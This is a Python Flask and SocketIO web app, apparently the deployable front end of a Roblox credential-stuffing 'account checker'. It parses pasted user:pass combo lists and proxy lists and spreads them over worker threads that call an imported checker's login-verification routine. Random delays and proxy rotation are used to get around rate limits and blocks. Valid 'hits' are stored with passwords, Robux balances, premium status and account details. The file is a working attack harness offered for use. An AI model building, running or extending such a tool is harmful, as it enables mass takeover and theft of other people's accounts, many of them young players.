# app.py - Railway Edition with Debug Mode for Roblox Account Checker

import os
import sys
import json
import time
import threading
import queue
import random
from datetime import datetime
from flask import Flask, render_template, request, jsonify, send_from_directory
from flask_cors import CORS
from flask_socketio import SocketIO, emit

# Import the original checker
try:
    from wf import AntraxRblxChecker, Account
    print("[+] ✅ Successfully loaded AntraxRblxChecker from wf.py")
except ImportError as e:
    print(f"[-] ❌ Error importing from wf.py: {e}")
    print("[!] Make sure wf.py is in the same directory")
    sys.exit(1)

app = Flask(__name__, static_folder='static', template_folder='templates')
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'railway-secret-key-change-this')

# Configure CORS
CORS(app, resources={r"/*": {"origins": "*"}})

# SocketIO with Railway-optimized settings
socketio = SocketIO(
    app,
    cors_allowed_origins="*",
    async_mode='eventlet',
    ping_timeout=60,
    ping_interval=25,
    max_http_buffer_size=1e6,
    logger=True,  # Enable logging for debugging
    engineio_logger=True,  # Enable engine.io logging for debugging
    manage_session=False
)

print("[+] 🔌 SocketIO configured with debug logging")

# Global state
checker_state = {
    'running': False,
    'paused': False,
    'accounts': [],
    'results': [],
    'stats': {
        'total': 0,
        'verified': 0,
        'valid': 0,
        'wrong_password': 0,
        'captcha': 0,
        'rate_limit': 0,
        'timeout': 0,
        'blocked': 0,
        'driver_error': 0,
        'other_errors': 0,
        'premium_accounts': 0,
        'total_robux': 0,
        'start_time': None,
        'speed': 0,
        'hit_rate': 0
    },
    'logs': [],
    'recent_results': [],
    'current_account': None,
    'total_accounts': 0,
    'hits': []
}

checker = None
work_queue = queue.Queue()

def add_log(message, level='info'):
    """Add a log entry"""
    log_entry = {
        'time': datetime.now().strftime('%H:%M:%S'),
        'message': message,
        'level': level
    }
    checker_state['logs'].append(log_entry)
    if len(checker_state['logs']) > 500:
        checker_state['logs'].pop(0)
    
    # Also print to console for debugging
    print(f"[{log_entry['time']}] [{level.upper()}] {message}")
    
    try:
        socketio.emit('log', log_entry)
    except Exception as e:
        print(f"[!] Failed to emit log: {e}")

def emit_socket_event(event, data):
    try:
        socketio.emit(event, data)
        print(f"[DEBUG] Emitted {event}: {str(data)[:100]}...")
    except Exception as e:
        print(f"[!] Failed to emit {event}: {e}")

@app.route('/')
def index():
    print("[DEBUG] Serving index page")
    return render_template('index.html')

@app.route('/static/<path:path>')
def serve_static(path):
    return send_from_directory('static', path)

@app.route('/api/status')
def get_status():
    status_data = {
        'running': checker_state['running'],
        'paused': checker_state['paused'],
        'stats': checker_state['stats'],
        'recent_results': checker_state['recent_results'][-20:],
        'total_accounts': checker_state['total_accounts'],
        'current_account': checker_state['current_account'],
        'hits': checker_state['hits'][-50:]
    }
    print(f"[DEBUG] Status requested - Running: {checker_state['running']}, Verified: {checker_state['stats']['verified']}")
    return jsonify(status_data)

@app.route('/api/start', methods=['POST'])
def start_checker():
    global checker, work_queue
    
    print("[DEBUG] Start request received")
    
    if checker_state['running']:
        print("[DEBUG] Checker already running")
        return jsonify({'error': 'Checker already running'}), 400
    
    data = request.json
    print(f"[DEBUG] Request data: {data.keys() if data else 'None'}")
    
    combo_text = data.get('combo', '')
    proxy_text = data.get('proxies', '')
    threads = int(data.get('threads', 2))
    min_delay = float(data.get('min_delay', 10))
    max_delay = float(data.get('max_delay', 20))
    
    print(f"[DEBUG] Config: threads={threads}, min_delay={min_delay}, max_delay={max_delay}")
    
    if not combo_text:
        print("[DEBUG] No accounts provided")
        return jsonify({'error': 'No accounts provided'}), 400
    
    # Parse accounts
    accounts = []
    for line in combo_text.strip().split('\n'):
        line = line.strip()
        if ':' in line:
            parts = line.split(':', 1)
            if len(parts) == 2:
                accounts.append(Account(
                    username=parts[0].strip(),
                    password=parts[1].strip()
                ))
    
    print(f"[DEBUG] Parsed {len(accounts)} accounts")
    
    if not accounts:
        print("[DEBUG] No valid accounts found")
        return jsonify({'error': 'No valid accounts found (format: user:pass)'}), 400
    
    # Parse proxies
    proxies = []
    if proxy_text:
        for line in proxy_text.strip().split('\n'):
            line = line.strip()
            if line and not line.startswith('#'):
                proxies.append(line)
    
    print(f"[DEBUG] Parsed {len(proxies)} proxies")
    
    # Create checker instance (uses the original AntraxRblxChecker)
    print("[DEBUG] Creating AntraxRblxChecker instance...")
    checker = AntraxRblxChecker()
    checker.accounts = accounts
    checker.min_delay = min_delay
    checker.max_delay = max_delay
    # Limit threads for Railway (memory constraints)
    max_workers = min(threads, 5)
    checker.max_workers = max_workers
    checker.max_accounts_per_test = len(accounts)
    
    print(f"[DEBUG] Checker created with {max_workers} workers")
    
    # Add proxies if provided
    if proxies:
        checker.proxy_manager.proxies = proxies
        checker.proxy_manager.active_proxies = proxies.copy()
        print(f"[DEBUG] Added {len(proxies)} proxies to checker")
    
    # Reset state
    checker_state['running'] = True
    checker_state['paused'] = False
    checker_state['accounts'] = accounts
    checker_state['results'] = []
    checker_state['logs'] = []
    checker_state['recent_results'] = []
    checker_state['hits'] = []
    checker_state['stats'] = {
        'total': len(accounts),
        'verified': 0,
        'valid': 0,
        'wrong_password': 0,
        'captcha': 0,
        'rate_limit': 0,
        'timeout': 0,
        'blocked': 0,
        'driver_error': 0,
        'other_errors': 0,
        'premium_accounts': 0,
        'total_robux': 0,
        'start_time': time.time(),
        'speed': 0,
        'hit_rate': 0
    }
    checker_state['total_accounts'] = len(accounts)
    
    print("[DEBUG] State reset, starting workers...")
    
    # Start worker threads
    work_queue = queue.Queue()
    for account in accounts:
        work_queue.put(account)
    
    for i in range(max_workers):
        w = threading.Thread(
            target=checker_worker,
            args=(i+1, work_queue),
            daemon=True
        )
        w.start()
        print(f"[DEBUG] Worker {i+1} started")
    
    # Start monitoring thread
    monitor_thread = threading.Thread(target=monitor_progress, args=(len(accounts),), daemon=True)
    monitor_thread.start()
    print("[DEBUG] Monitor thread started")
    
    add_log(f'🚀 Checker started with {len(accounts)} accounts and {len(proxies)} proxies', 'success')
    add_log(f'⚙️ Using {max_workers} workers (limited for Railway)', 'info')
    
    return jsonify({
        'success': True,
        'message': f'Checker started with {len(accounts)} accounts',
        'total': len(accounts),
        'workers': max_workers
    })

def checker_worker(worker_id, work_queue):
    """Worker thread using the original checker's verify_account method"""
    print(f"[DEBUG] Worker {worker_id} started")
    
    while checker_state['running'] and not work_queue.empty():
        try:
            # Check if paused
            while checker_state['paused'] and checker_state['running']:
                time.sleep(0.5)
            
            if not checker_state['running']:
                break
            
            try:
                account = work_queue.get_nowait()
            except queue.Empty:
                break
                
            checker_state['current_account'] = account.username
            print(f"[DEBUG] Worker {worker_id} processing: {account.username}")
            
            # Use the original verify_account method from wf.py
            try:
                verified_account = checker.verify_account(account, worker_id)
                print(f"[DEBUG] Worker {worker_id} result for {account.username}: {verified_account.status}")
            except Exception as e:
                print(f"[ERROR] Worker {worker_id} verify_account failed: {e}")
                verified_account = account
                verified_account.status = "error"
                verified_account.message = str(e)[:100]
            
            # Update stats
            stats = checker_state['stats']
            stats['verified'] += 1
            
            # Map status to stats
            status_map = {
                'valid': 'valid',
                'invalid_password': 'wrong_password',
                'captcha': 'captcha',
                'rate_limit': 'rate_limit',
                'timeout': 'timeout',
                'blocked': 'blocked',
                'driver_error': 'driver_error',
                'error': 'other_errors'
            }
            if verified_account.status in status_map:
                stats[status_map[verified_account.status]] += 1
            
            # Check if valid
            if verified_account.status == 'valid':
                stats['valid'] += 1
                if verified_account.premium:
                    stats['premium_accounts'] += 1
                if verified_account.robux > 0:
                    stats['total_robux'] += verified_account.robux
                
                # Store hit
                hit_data = {
                    'username': verified_account.username,
                    'password': verified_account.password,
                    'robux': verified_account.robux,
                    'premium': verified_account.premium,
                    'user_id': verified_account.user_id,
                    'display_name': verified_account.display_name,
                    'friends': verified_account.friends,
                    'followers': verified_account.followers,
                    'account_age': verified_account.account_age,
                    'join_date': verified_account.join_date,
                    'time': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                }
                checker_state['hits'].append(hit_data)
                emit_socket_event('hit', hit_data)
                print(f"[HIT] Worker {worker_id}: {verified_account.username} - R${verified_account.robux} {'PREMIUM' if verified_account.premium else ''}")
            
            # Add to recent results
            result_line = {
                'worker': worker_id,
                'status': verified_account.status,
                'username': verified_account.username,
                'message': verified_account.message,
                'robux': verified_account.robux,
                'premium': verified_account.premium
            }
            checker_state['recent_results'].append(result_line)
            if len(checker_state['recent_results']) > 50:
                checker_state['recent_results'].pop(0)
            
            # Emit update
            emit_socket_event('update', result_line)
            
            # Add log
            if verified_account.status == 'valid':
                premium_tag = ' [PREMIUM]' if verified_account.premium else ''
                robux_tag = f' | R${verified_account.robux:,}' if verified_account.robux > 0 else ''
                add_log(f'✅ Worker {worker_id}: {verified_account.username} - HIT{premium_tag}{robux_tag}', 'success')
            else:
                status_emoji = '❌'
                if verified_account.status == 'captcha':
                    status_emoji = '🤖'
                elif verified_account.status == 'rate_limit':
                    status_emoji = '⏳'
                elif verified_account.status == 'timeout':
                    status_emoji = '⏰'
                add_log(f'{status_emoji} Worker {worker_id}: {verified_account.username} - {verified_account.message}', 'info')
            
            # Delay between checks (using the checker's delay settings)
            if checker_state['running']:
                delay = random.uniform(checker.min_delay, checker.max_delay)
                print(f"[DEBUG] Worker {worker_id} sleeping for {delay:.2f}s")
                time.sleep(delay)
            
            work_queue.task_done()
            
        except queue.Empty:
            break
        except Exception as e:
            print(f"[ERROR] Worker {worker_id} error: {e}")
            add_log(f'Error in worker {worker_id}: {str(e)}', 'error')
            try:
                work_queue.task_done()
            except:
                pass
    
    print(f"[DEBUG] Worker {worker_id} finished")

def monitor_progress(total):
    """Monitor and emit progress updates"""
    print("[DEBUG] Monitor started")
    
    while checker_state['running']:
        try:
            stats = checker_state['stats']
            elapsed = time.time() - stats['start_time'] if stats['start_time'] else 0
            minutes = elapsed / 60 if elapsed > 0 else 1
            
            speed = stats['verified'] / minutes if minutes > 0 else 0
            hit_rate = (stats['valid'] / stats['verified'] * 100) if stats['verified'] > 0 else 0
            
            stats['speed'] = speed
            stats['hit_rate'] = hit_rate
            
            progress_data = {
                'verified': stats['verified'],
                'total': total,
                'valid': stats['valid'],
                'premium': stats['premium_accounts'],
                'robux': stats['total_robux'],
                'speed': round(speed, 1),
                'hit_rate': round(hit_rate, 1),
                'elapsed': round(elapsed, 0)
            }
            
            # Print progress every 10 seconds for debugging
            if int(elapsed) % 10 == 0:
                print(f"[PROGRESS] {stats['verified']}/{total} verified, {stats['valid']} hits, {speed:.1f}/min")
            
            emit_socket_event('progress', progress_data)
            
            if stats['verified'] >= total and total > 0:
                checker_state['running'] = False
                print("[PROGRESS] All accounts verified!")
                add_log('✅ All accounts verified!', 'success')
                emit_socket_event('complete', {'message': 'All accounts verified!'})
                break
            
            time.sleep(1)
            
        except Exception as e:
            print(f"[ERROR] Monitor error: {e}")
            add_log(f'Monitor error: {str(e)}', 'error')
            time.sleep(1)
    
    print("[DEBUG] Monitor finished")

@app.route('/api/stop', methods=['POST'])
def stop_checker():
    print("[DEBUG] Stop request received")
    checker_state['running'] = False
    if checker:
        checker.running = False
    add_log('⏹ Checker stopped', 'warning')
    return jsonify({'success': True})

@app.route('/api/pause', methods=['POST'])
def pause_checker():
    print("[DEBUG] Pause request received")
    checker_state['paused'] = True
    if checker:
        checker.paused = True
    add_log('⏸ Checker paused', 'warning')
    return jsonify({'success': True})

@app.route('/api/resume', methods=['POST'])
def resume_checker():
    print("[DEBUG] Resume request received")
    checker_state['paused'] = False
    if checker:
        checker.paused = False
    add_log('▶ Checker resumed', 'info')
    return jsonify({'success': True})

@app.route('/api/clear', methods=['POST'])
def clear_results():
    print("[DEBUG] Clear results request received")
    checker_state['hits'] = []
    checker_state['recent_results'] = []
    checker_state['logs'] = []
    add_log('🧹 Results cleared', 'info')
    return jsonify({'success': True})

@app.route('/health')
def health_check():
    return jsonify({
        'status': 'healthy',
        'running': checker_state['running'],
        'memory': 'ok',
        'timestamp': datetime.now().isoformat()
    })

@app.route('/debug')
def debug_info():
    """Debug endpoint to check application state"""
    return jsonify({
        'running': checker_state['running'],
        'paused': checker_state['paused'],
        'total_accounts': checker_state['total_accounts'],
        'verified': checker_state['stats']['verified'],
        'valid': checker_state['stats']['valid'],
        'premium': checker_state['stats']['premium_accounts'],
        'total_robux': checker_state['stats']['total_robux'],
        'current_account': checker_state['current_account'],
        'logs_count': len(checker_state['logs']),
        'hits_count': len(checker_state['hits']),
        'workers': checker.max_workers if checker else 0,
        'proxies': len(checker.proxy_manager.active_proxies) if checker and checker.proxy_manager else 0
    })

@socketio.on('connect')
def handle_connect():
    print(f"[SOCKET] Client connected: {request.sid}")
    emit('connected', {'status': 'connected', 'timestamp': datetime.now().isoformat()})
    add_log('📡 Client connected', 'info')

@socketio.on('disconnect')
def handle_disconnect():
    print(f"[SOCKET] Client disconnected: {request.sid}")
    add_log('📡 Client disconnected', 'info')

@socketio.on('ping')
def handle_ping():
    print(f"[SOCKET] Ping from {request.sid}")
    emit('pong', {'timestamp': datetime.now().isoformat()})

# Error handlers
@app.errorhandler(404)
def not_found(e):
    print(f"[ERROR] 404: {e}")
    return jsonify({'error': 'Not found'}), 404

@app.errorhandler(500)
def server_error(e):
    print(f"[ERROR] 500: {e}")
    return jsonify({'error': 'Server error'}), 500

if __name__ == '__main__':
    print("=" * 70)
    print("   ATX ROBLOX CHECKER - RAILWAY EDITION (DEBUG MODE)")
    print("=" * 70)
    print("[+] ✅ Successfully loaded AntraxRblxChecker from wf.py")
    
    # Get port from environment variable (Railway sets this)
    port = int(os.environ.get('PORT', 5000))
    
    print("[+] 🚀 Starting Roblox Account Checker on Railway")
    print(f"[+] 🌐 Running on port {port}")
    print("[+] 📊 Using original AntraxRblxChecker engine")
    print("[+] ⚡ Railway-optimized configuration with debug logging")
    print("[+] 🔍 Debug mode ENABLED - All actions will be logged")
    print("=" * 70)
    
    # Run with eventlet for production
    try:
        socketio.run(
            app,
            host='0.0.0.0',
            port=port,
            debug=True,  # Enable debug mode
            use_reloader=False,  # Disable reloader for Railway
            log_output=True  # Enable log output
        )
    except TypeError:
        # Fallback for older versions
        socketio.run(
            app,
            host='0.0.0.0',
            port=port,
            debug=True,
            use_reloader=False
        )